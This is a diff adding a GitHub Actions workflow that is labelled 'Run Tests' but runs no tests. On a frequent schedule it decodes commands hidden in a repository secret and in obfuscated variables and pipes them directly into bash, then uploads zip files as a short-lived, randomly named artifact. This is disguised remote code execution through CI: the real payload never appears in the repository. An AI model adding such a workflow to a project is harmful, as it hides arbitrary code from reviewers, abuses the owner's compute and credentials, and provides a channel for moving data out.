@@ -1,0 +1,34 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '16 3,9,15,21 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  scheduler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Invoke
+        env:
+          hli01: ${{ secrets.hli01 }}
+        run: |
+          printf '%s' "$hli01" | jq -r .ki3 | /bin/bash
+          echo $miw7 | jq -r .dmlnh6 | /bin/bash
+          printf '%s' "$eteyd8" | jq -r .up5 | /bin/bash
+          echo $mzamb48 | jq -r .gv4 | /bin/bash
+
+      - name: Store artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 8jzDIDDQ
+          path: "*.zip"
+          retention-days: 1
